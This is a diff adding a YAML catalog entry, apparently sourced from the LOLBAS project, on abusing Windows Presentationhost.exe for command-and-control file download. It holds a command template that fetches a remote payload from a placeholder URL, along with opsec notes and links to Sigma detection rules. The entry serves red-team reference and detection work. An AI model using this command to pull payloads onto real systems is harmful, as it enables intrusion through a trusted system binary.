@@ -1,0 +1,31 @@
+id: lolbas/presentationhost/download/1
+type: binary
+platform: windows
+name: Presentationhost.exe
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0 (verify upstream LICENSE)
+  upstream_version: 9c5e384
+  last_synced: '2026-08-25'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  triggers: Execution of .xbap files may not be common on production workstations
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost_download.yml
+  - https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost.yml
+commands:
+- template: Presentationhost.exe {REMOTEURL}
+  comment: It will download a remote payload and place it in INetCache.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Presentationhost/
+tags:
+- windows
+- lolbas
